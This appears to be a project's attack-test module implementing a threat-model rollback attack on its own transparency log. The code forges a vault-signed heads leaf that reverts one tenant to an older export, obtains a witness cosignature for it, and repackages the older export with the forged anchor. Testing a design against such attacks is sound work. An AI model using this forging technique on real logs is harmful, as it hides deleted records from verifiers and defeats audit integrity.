// The vault host attacker of docs/signer.md: it holds the vault signing key, the database and the network, and wants a tenant's
// newest records gone while verifiers still see a fresh witnessed anchor. It signs the next heads leaf with the tenant at the size
// of an older export (every other entry unchanged), asks a witness to cosign it (the heads log itself only grew) and ships the
// older export with that anchor. Only modules of the round 1 code base are used, so the same attack also runs against cf45e19.
import {join} from 'node:path';
import {DatabaseSync} from 'node:sqlite';
import * as T from '../../src/tlog.mjs';
import {headsRow, headsSize} from '../../src/transparency.mjs';

// The forged heads leaf after the database's newest one, signed with the vault key, with the consistency proof a witness needs.
export function rollbackLeaf({dataDir, base, key, tenant, older}) {
  const origin = T.headsOrigin(base), log = T.tenantOrigin(base, tenant), was = T.parseCheckpoint(T.noteText(older.transparency.checkpoint));
  const db = new DatabaseSync(join(dataDir, 'evidence.db'), {readOnly: true});
  let n, row, leaves;
  try {
    n = headsSize(db, origin);
    row = headsRow(db, origin, n - 1);
    leaves = db.prepare('SELECT leaf FROM tlog_heads WHERE origin=? ORDER BY idx').all(origin).map(r => Buffer.from(r.leaf));
  } finally { db.close(); }
  const peaks = T.frontierAppend(T.blobToPeaks(row.peaks, n - 1), n - 1, Buffer.from(row.leaf));
  const entries = T.sortHeadsEntries(JSON.parse(row.entries).map(e => (e.log === log ? T.headsEntry(log, was.size, was.root) : e)));
  const leaf = T.headsLeafHash(T.headsLeafContent(entries));
  const note = T.signNote(T.formatCheckpoint({origin, size: n + 1, root: T.frontierRoot(T.frontierAppend(peaks, n, leaf))}), T.noteSigner(origin, key));
  return {origin, log, size: n, root: T.frontierRoot(peaks), entries, note, proof: T.consistencyProofFromFrontier(n, peaks, [leaf]),
    leaves: [...leaves, leaf], olderSize: was.size, newerSize: JSON.parse(row.entries).find(e => e.log === log).size};
}
export async function submitForged(witnessUrl, forged) {
  const r = await T.postAddCheckpoint(witnessUrl, T.addCheckpointBody(forged.size, forged.proof, forged.note));
  return {status: r.status, body: r.body.trim().slice(0, 200), cosignatures: r.status === 200 ? T.parseCosignatureResponse(r.body) : []};
}
// The older export carrying the forged leaf, with the witness cosignatures, as its heads anchor.
export function withForgedAnchor(older, forged, cosignatures) {
  const i = forged.entries.findIndex(e => e.log === forged.log);
  return {...older, transparency: {...older.transparency, heads: {origin: forged.origin, checkpoint: forged.note + cosignatures.join(''),
    leafIndex: forged.size, leafProof: T.inclusionProof(forged.leaves, forged.size).map(T.b64), leaf: T.headsLeafContent(forged.entries),
    entry: forged.entries[i], entryIndex: i, entryProof: T.inclusionProof(forged.entries.map(T.headsEntryLeaf), i).map(T.b64)}}};
}
